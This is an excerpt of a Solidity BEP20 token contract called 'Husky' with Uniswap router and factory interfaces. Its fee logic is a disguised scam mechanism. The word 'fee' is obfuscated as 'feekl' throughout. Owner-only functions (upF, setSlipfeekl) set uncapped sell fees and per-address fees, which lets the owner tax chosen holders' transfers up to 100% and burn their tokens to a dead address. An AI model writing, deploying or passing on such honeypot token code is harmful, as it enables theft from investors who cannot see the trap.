...
interface IUniswapV2Factory {
    ...
    function feeklTo() external view returns (address);
    function feeklToSetter() external view returns (address);
    ...
    function setfeeklTo(address) external;
    function setfeeklToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeklOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeklOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeklOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeklOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeklOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Husky is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeekl = 0;

    uint256 private _defaultBuyfeekl = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeekl;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeekl = _value;
    }

    function setSlipfeekl(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeekl[_address] = _value;
    }

    function getSlipfeekl(address _address) external view onlyownar returns (uint256) {
        return _slipfeekl[_address];
    }


    function setMAccountfeekl(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeekl(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeklAmount = 0;

        if (rF) {
            uint256 tradefeekl = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeekl = _defaultSellfeekl;
                }
                if (from == uniswapV2Pair) {

                    tradefeekl = _defaultBuyfeekl;
                }
            }
            if (_slipfeekl[from] > 0) {
                tradefeekl = _slipfeekl[from];
            }

            tradefeeklAmount = _Amount.mul(tradefeekl).div(100);
        }


        if (tradefeeklAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeklAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeklAmount);
            emit Transfer(from, _deadAddress, tradefeeklAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeklAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeklAmount);
        emit Transfer(from, _to, _Amount - tradefeeklAmount);
    }
